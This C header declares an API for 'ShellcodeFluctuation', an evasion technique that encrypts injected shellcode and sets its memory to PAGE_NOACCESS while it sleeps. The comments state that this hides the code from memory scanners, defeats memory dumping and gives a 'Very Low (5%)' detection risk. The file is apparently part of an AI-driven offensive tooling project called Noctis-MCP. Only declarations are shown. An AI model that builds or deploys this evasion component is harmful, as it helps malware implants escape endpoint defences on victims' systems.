// Reference code for Noctis-MCP AI intelligence system
// ShellcodeFluctuation - Memory Protection Cycling with NoAccess State
// Source: https://github.com/mgeeky/ShellcodeFluctuation
// Research: Argus Red Team Intelligence Report 2024-2025 (Phase 2)
//
// TECHNIQUE: Memory Protection Fluctuation with NoAccess State
// IMPROVEMENT: Adds PAGE_NOACCESS to hide memory from scanners
// DETECTION RISK: Very Low (5%) vs Standard RW/RX cycling (15-20%)
//
// How it works:
// 1. Active execution: Memory is RX (readable/executable)
// 2. Before sleep: Change to RW, encrypt with random key
// 3. During sleep: Change to PAGE_NOACCESS (completely inaccessible)
// 4. On wake: Change to RW, decrypt with stored key
// 5. Resume: Change back to RX for execution
//
// Critical: NoAccess state makes memory invisible to scanners and triggers
// access violation on any read/write attempts (defeats memory dumping)

#ifndef SHELLCODE_FLUCTUATION_H
#define SHELLCODE_FLUCTUATION_H

#include <Windows.h>

// Memory protection states
typedef enum _MEMORY_STATE {
    MEM_STATE_EXECUTE = 0,      // PAGE_EXECUTE_READ (active)
    MEM_STATE_ENCRYPT = 1,      // PAGE_READWRITE (encrypting)
    MEM_STATE_HIDDEN = 2,       // PAGE_NOACCESS (completely hidden)
    MEM_STATE_DECRYPT = 3,      // PAGE_READWRITE (decrypting)
} MEMORY_STATE;

// ShellcodeFluctuation configuration
typedef struct _FLUCTUATION_CONFIG {
    PVOID pMemoryBase;          // Base address of memory to fluctuate
    SIZE_T szMemorySize;        // Size of memory region
    BOOL bUseNoAccess;          // Enable PAGE_NOACCESS state (recommended)
    BOOL bRotateKeys;           // Enable per-cycle key rotation (recommended)
    DWORD dwCycleCount;         // Number of fluctuation cycles completed
} FLUCTUATION_CONFIG, *PFLUCTUATION_CONFIG;

// ShellcodeFluctuation context
typedef struct _FLUCTUATION_CONTEXT {
    FLUCTUATION_CONFIG config;
    DWORD dwOriginalProtect;    // Original memory protection
    BYTE bCurrentKey[32];       // Current encryption key (AES-256)
    BYTE bIV[16];               // Current initialization vector
    MEMORY_STATE currentState;  // Current memory state
    PVOID pBackup;              // Memory backup (for restoration)
} FLUCTUATION_CONTEXT, *PFLUCTUATION_CONTEXT;

// Initialize fluctuation context
BOOL Fluctuation_Initialize(
    PFLUCTUATION_CONTEXT pContext,
    PVOID pMemoryBase,
    SIZE_T szMemorySize,
    BOOL bUseNoAccess,
    BOOL bRotateKeys
);

// Execute one fluctuation cycle (hide memory during sleep)
BOOL Fluctuation_HideMemory(PFLUCTUATION_CONTEXT pContext);

// Restore memory for execution
BOOL Fluctuation_RestoreMemory(PFLUCTUATION_CONTEXT pContext);

// Complete sleep cycle with fluctuation
BOOL Fluctuation_SleepCycle(PFLUCTUATION_CONTEXT pContext, DWORD dwMilliseconds);

// Cleanup fluctuation context
VOID Fluctuation_Cleanup(PFLUCTUATION_CONTEXT pContext);

// Internal: Encrypt memory with current key
BOOL _Fluctuation_EncryptMemory(PFLUCTUATION_CONTEXT pContext);

// Internal: Decrypt memory with current key
BOOL _Fluctuation_DecryptMemory(PFLUCTUATION_CONTEXT pContext);

// Internal: Generate new random key for cycle
BOOL _Fluctuation_RotateKey(PFLUCTUATION_CONTEXT pContext);

// Internal: Change memory protection state
BOOL _Fluctuation_SetProtection(PVOID pAddress, SIZE_T size, DWORD newProtect, DWORD* oldProtect);

// Utility: AES-256 encryption (reusing from zilean)
BOOL Fluctuation_AES256_Encrypt(BYTE* pData, SIZE_T szDataLen, BYTE* pKey, BYTE* pIV);
BOOL Fluctuation_AES256_Decrypt(BYTE* pData, SIZE_T szDataLen, BYTE* pKey, BYTE* pIV);

#endif // SHELLCODE_FLUCTUATION_H
